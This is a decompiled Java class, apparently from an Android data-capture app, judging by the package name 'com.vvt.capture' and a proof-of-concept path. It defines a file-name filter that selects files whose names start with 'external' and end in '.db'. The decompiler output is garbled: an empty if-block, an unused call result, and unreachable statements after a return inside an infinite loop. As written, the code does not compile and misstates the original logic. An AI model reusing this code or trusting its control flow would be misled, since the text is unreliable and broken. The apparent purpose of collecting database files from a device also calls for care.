package com.vvt.capture.c.a.a;

import java.io.File;
import java.io.FilenameFilter;

final class e
  implements FilenameFilter
{
  public boolean accept(File paramFile, String paramString)
  {
    boolean bool = d.a();
    if (bool) {}
    String str = "external";
    bool = paramString.startsWith(str);
    if (bool)
    {
      str = ".db";
      bool = paramString.endsWith(str);
      if (bool) {
        bool = true;
      }
    }
    for (;;)
    {
      return bool;
      bool = false;
      str = null;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/MyUncaughtExceptionHandler/a/a/e.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */